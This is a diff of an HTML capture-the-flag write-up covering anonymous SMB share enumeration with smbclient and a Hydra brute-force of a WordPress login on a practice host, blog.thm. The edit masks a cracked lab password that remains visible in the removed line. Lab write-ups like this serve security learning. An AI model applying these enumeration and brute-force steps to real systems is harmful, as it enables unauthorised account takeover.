@@ -487,7 +487,7 @@ ff02::2 ip6-allrouters
 <h3 id="14-smb">1.4 SMB</h3>
 <p>Let&rsquo;s explore the SMB port that was open.</p>
 <pre><code>┌──(kali㉿kali)-[/tmp]
-└─$ smbclient -L 10.10.129.188 -N                                           130 ⨯
+└─$ smbclient -L 10.10.129.188 -N
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -515,7 +515,7 @@ smb: \&gt;
 </code></pre><p>I have a feeling its a rickroll. Also, taylor swift uh huh. Plus, the author of the room mentioned to not go down &ldquo;the rabbit hole&rdquo;.</p>
 <p>Went to the qrcode link. Here&rsquo;s not a rickroll XD</p>
 <p><a href="https://www.youtube.com/watch?v=eFTLKWw542g">https://www.youtube.com/watch?v=eFTLKWw542g</a></p>
-<p><img src="https://i.imgur.com/Ql3cqlS.png" alt=""  /></p>
+<p><img src="https://i.imgur.com/Ql3cqlS.png" alt="image of the rabbithole images"  /></p>
 <p>Clearly the rabbit hole.</p>
 <h3 id="15-bruteforce-passwords">1.5 Bruteforce passwords</h3>
 <p>I cant seem to find any creds lying around. So we&rsquo;ll try getting into <code>bjoel</code> and <code>kwheel</code>&rsquo;s accounts by bruteforcing with Hydra.</p>
@@ -536,7 +536,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 06:33:
 [DATA] attacking http-post-form://blog.thm:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&amp;testcookie=1:F=password
 [STATUS] 847.00 tries/min, 847 tries in 00:01h, 14343552 to do in 282:15h, 16 active
 [STATUS] 845.00 tries/min, 2535 tries in 00:03h, 14341864 to do in 282:53h, 16 active
-[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1
+[80][http-post-form] host: blog.thm   login: kwheel   password: {hidden}
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 06:37:11
 </code></pre><h2 id="2-foothold">2. Foothold</h2>
